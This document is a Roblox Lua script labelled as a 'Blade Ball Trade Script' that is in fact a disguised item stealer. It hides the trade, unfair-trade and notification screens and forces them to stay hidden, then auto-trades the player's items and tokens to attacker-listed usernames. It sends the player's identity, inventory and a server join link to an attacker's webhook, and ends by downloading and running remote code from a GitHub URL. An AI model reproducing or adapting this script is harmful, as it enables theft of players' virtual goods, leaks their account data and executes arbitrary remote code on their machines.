-- Blade Ball Trade Script - Fixed Item Collection
-- Silent version - No debug outputs

local itemsToSend = {}
local allItemsList = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Configuration
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- Validation
if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

-- Allow trade requests from everyone
local tradeArgs = {
    [1] = "AllowRequests",
    [2] = "Everyone"
}
netModule:WaitForChild("RF/Trading/SetSetting"):InvokeServer(unpack(tradeArgs))

-- Hide UI elements
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
    maintradegui.Visible = false
end)

local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
    unfairTade.Visible = false
end)

local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    notificationsFrame.Visible = false
end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

-- Trade Functions
local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    repeat
        task.wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
    until response == true
end

local function addItemToTrade(itemType, ID)
    local args = {
        [1] = itemType,
        [2] = ID
    }
    repeat
        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
    until response == true
end

local function readyTrade()
    local args = {
        [1] = true
    }
    repeat
        task.wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
    until response == true
end

local function confirmTrade()
    repeat
        task.wait(0.1)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Initialize totals
local totalRAP = 0
local totalTokens = 0
local tradeTokens = 0

-- Get current tokens
local function getCurrentTokens()
    local tokenText = "0"
    if PlayerGui:FindFirstChild("TradeRequest") then
        local main = PlayerGui.TradeRequest.Main
        if main and main:FindFirstChild("Currency") then
            local currency = main.Currency
            if currency and currency:FindFirstChild("Coins") then
                local coins = currency.Coins
                if coins and coins:FindFirstChild("Amount") then
                    tokenText = coins.Amount.Text or "0"
                end
            end
        end
    end
    local cleanedText = tokenText:gsub("[^%d]", "")
    return tonumber(cleanedText) or 0
end

-- Webhook Function
local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
    local categorizedItems = {
        Sword = {},
        Emote = {},
        Explosion = {}
    }
    
    local tradeCategorizedItems = {
        Sword = {},
        Emote = {},
        Explosion = {}
    }
    
    for _, item in ipairs(allItems) do
        if categorizedItems[item.itemType] then
            table.insert(categorizedItems[item.itemType], item)
        end
    end
    
    for _, item in ipairs(tradeItems) do
        if tradeCategorizedItems[item.itemType] then
            table.insert(tradeCategorizedItems[item.itemType], item)
        end
    end
    
    local totalAllRAP = 0
    for _, item in ipairs(allItems) do
        totalAllRAP = totalAllRAP + item.RAP
    end
    
    local totalTradeRAP = 0
    for _, item in ipairs(tradeItems) do
        totalTradeRAP = totalTradeRAP + item.RAP
    end
    
    local fields = {}
    
    -- Player Information Box
    local accountAge = math.floor(plr.AccountAge / 86400) -- Convert seconds to days
    table.insert(fields, {
        name = "👤 Player Information",
        value = string.format("```\nName: %s\nUser ID: %d\nAccount Age: %d days\n```", 
            plr.Name, plr.UserId, accountAge),
        inline = false
    })
    
    if isJoinMessage then
        table.insert(fields, {
            name = "🔗 Join Server",
            value = string.format("[**Click to Join Server**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=%s)", game.JobId),
            inline = false
        })
    end
    
    local inventorySummary = ""
    for _, category in ipairs(categories) do
        local items = categorizedItems[category]
        if #items > 0 then
            local categoryRAP = 0
            for _, item in ipairs(items) do
                categoryRAP = categoryRAP + item.RAP
            end
            
            local categoryIcon = category == "Sword" and "⚔️" or category == "Emote" and "💃" or "💥"
            inventorySummary = inventorySummary .. string.format("%s **%s:** %d items | %s RAP\n", 
                categoryIcon, category, #items, formatNumber(categoryRAP))
        end
    end
    
    table.insert(fields, {
        name = "📦 Full Inventory Overview",
        value = string.format("```\n%s\n```", inventorySummary ~= "" and inventorySummary or "No items found"),
        inline = false
    })
    
    table.insert(fields, {
        name = "════════════════════════",
        value = "",
        inline = false
    })
    
    if #tradeItems > 0 then
        table.insert(fields, {
            name = "🚀 Items to Trade (Min RAP: " .. formatNumber(min_rap) .. ")",
            value = string.format("**Total Items:** %d\n**Total RAP Value:** %s", 
                #tradeItems, formatNumber(totalTradeRAP)),
            inline = false
        })
        
        for _, category in ipairs(categories) do
            local items = tradeCategorizedItems[category]
            if #items > 0 then
                table.sort(items, function(a, b)
                    return a.RAP > b.RAP
                end)
                
                local itemGroups = {}
                for _, item in ipairs(items) do
                    local key = item.Name .. "|" .. item.RAP
                    if not itemGroups[key] then
                        itemGroups[key] = {
                            name = item.Name,
                            rap = item.RAP,
                            count = 1
                        }
                    else
                        itemGroups[key].count = itemGroups[key].count + 1
                    end
                end
                
                local itemList = ""
                local categoryRAP = 0
                for _, group in pairs(itemGroups) do
                    local displayName = group.count > 1 and 
                        string.format("%s (×%d)", group.name, group.count) or 
                        group.name
                    itemList = itemList .. string.format("• %s - **%s** RAP\n", 
                        displayName, formatNumber(group.rap))
                    categoryRAP = categoryRAP + (group.rap * group.count)
                end
                
                local categoryIcon = category == "Sword" and "⚔️" or category == "Emote" and "💃" or "💥"
                
                table.insert(fields, {
                    name = string.format("%s %s (%d items) - %s RAP", 
                        categoryIcon, category, #items, formatNumber(categoryRAP)),
                    value = string.format("```\n%s\n```", itemList),
                    inline = false
                })
            end
        end
    else
        table.insert(fields, {
            name = "📭 No Items to Trade",
            value = string.format("No items meet the minimum RAP requirement of **%s**", formatNumber(min_rap)),
            inline = false
        })
    end
    
    if tokens > 0 then
        table.insert(fields, {
            name = "💰 Tokens",
            value = string.format("```\n%s\n```", string.format("**%s** Tokens", formatNumber(tokens))),
            inline = true
        })
    end
    
    table.insert(fields, {
        name = "🌐 Server Information",
        value = string.format("```\nServer ID: %s\nPlayers: %d/16\nPlace ID: %d\n```", 
            game.JobId, #Players:GetPlayers(), game.PlaceId),
        inline = false
    })
    
    local data = {
        ["embeds"] = {{
            ["title"] = isJoinMessage and "🎴 BLADE BALL - TARGET JOINED" or "🎴 BLADE BALL - TRADE EXECUTED",
            ["color"] = isJoinMessage and 16753920 or 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Blade Ball Trade System • discord.gg/GY2RVSEGDT"
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }
    
    if isJoinMessage and ping == "Yes" and (#tradeItems > 0 or tokens > 0) then
        data["content"] = "@everyone"
    end

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    local success, err = pcall(function()
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
end

-- Get RAP data
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]

    if not categoryRapData then
        return nameToRAP
    end

    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function()
            return HttpService:JSONDecode(serializedKey)
        end)

        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then
                    local itemName = pair[2]
                    nameToRAP[itemName] = rap
                    break
                end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do
    rapMappings[category] = buildNameToRAPMap(category)
end

local function getRAP(category, itemName)
    local rapMap = rapMappings[category]
    if rapMap then
        local rap = rapMap[itemName]
        if rap then
            return rap
        else
            -- If RAP not found, return 1 to meet minimum requirement
            -- This ensures items get traded while still respecting min_rap logic
            return 1
        end
    else
        return 1
    end
end

local itemCounts = {Sword = 0, Emote = 0, Explosion = 0}

for _, category in ipairs(categories) do
    local categoryItems = clientInventory[category]
    if categoryItems then
        for itemId, itemInfo in pairs(categoryItems) do
            if itemInfo.TradeLock then
                continue
            end
            
            itemCounts[category] = itemCounts[category] + 1
            local itemName = itemInfo.Name
            local rap = getRAP(category, itemName)
            
            table.insert(allItemsList, {
                ItemID = itemId, 
                RAP = rap, 
                itemType = category, 
                Name = itemName
            })
            
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {
                    ItemID = itemId, 
                    RAP = rap, 
                    itemType = category, 
                    Name = itemName
                })
            end
        end
    end
end

totalTokens = getCurrentTokens()
tradeTokens = totalTokens

if #itemsToSend == 0 and (itemCounts.Sword > 0 or itemCounts.Emote > 0 or itemCounts.Explosion > 0) then
    for _, category in ipairs(categories) do
        local categoryItems = clientInventory[category]
        if categoryItems then
            for itemId, itemInfo in pairs(categoryItems) do
                if itemInfo.TradeLock then
                    continue
                end
                
                local itemName = itemInfo.Name
                local rap = getRAP(category, itemName)
                
                -- Only add items that actually meet min_rap requirement
                if rap >= min_rap then
                    table.insert(itemsToSend, {
                        ItemID = itemId, 
                        RAP = rap,
                        itemType = category, 
                        Name = itemName
                    })
                end
            end
        end
    end
end

local originalItemsToSend = {}
for i, v in ipairs(itemsToSend) do
    originalItemsToSend[i] = v
end

if #itemsToSend > 0 or totalTokens > 0 then
    -- Send initial webhook notification
    SendWebhookMessage(true, allItemsList, itemsToSend, totalTokens)
    table.sort(itemsToSend, function(a, b)
        if a.itemType == b.itemType then
            return a.Name < b.Name
        end
        return a.itemType < b.itemType
    end)

    local function getNextBatch(items, batchSize)
        local batch = {}
        for i = 1, math.min(batchSize, #items) do
            table.insert(batch, table.remove(items, 1))
        end
        return batch
    end

    local function doTrade(targetUser)
        local batchNumber = 1
        local successCount = 0
        
        while #itemsToSend > 0 or tradeTokens > 0 do
            local requestSuccess, requestError = pcall(function()
                sendTradeRequest(targetUser)
            end)
            
            if not requestSuccess then
                break
            end
            
            local timeout = 30
            local startTime = tick()
            repeat
                task.wait(0.5)
            until inTrade or tick() - startTime > timeout
            
            if not inTrade then
                break
            end
            
            local currentBatch = getNextBatch(itemsToSend, 100)
            
            -- Add items to trade if any exist
            for _, item in ipairs(currentBatch) do
                local addSuccess, addError = pcall(function()
                    addItemToTrade(item.itemType, item.ItemID)
                end)
            end
            
            -- Always add tokens if available (even with no items)
            if tradeTokens > 0 then
                local tokenSuccess, tokenError = pcall(function()
                    netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tradeTokens)
                end)
                
                if tokenSuccess then
                    tradeTokens = 0
                end
            end
            
            -- Only proceed with trade if we have something to offer (items were added or tokens were added)
            -- This ensures the trade doesn't fail when there are only tokens
            if #currentBatch > 0 or totalTokens > 0 then
                readyTrade()
                confirmTrade()
            end
            
            successCount = successCount + 1
            batchNumber = batchNumber + 1
            
            task.wait(3)
        end
        
        SendWebhookMessage(false, allItemsList, originalItemsToSend, totalTokens)
    end

    local function waitForTargetUsers()
        local alreadyProcessed = {}
        
        local function processUser(player)
            if table.find(users, player.Name) and not alreadyProcessed[player.Name] then
                alreadyProcessed[player.Name] = true
                
                task.wait(2)
                
                local success, error = pcall(function()
                    doTrade(player.Name)
                end)
            end
        end
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= plr then
                processUser(player)
            end
        end
        
        Players.PlayerAdded:Connect(function(player)
            task.wait(1)
            processUser(player)
        end)
    end
    
    waitForTargetUsers()
end

task.wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/frierenXyz/buratrat/refs/heads/main/mainn.lua"))()
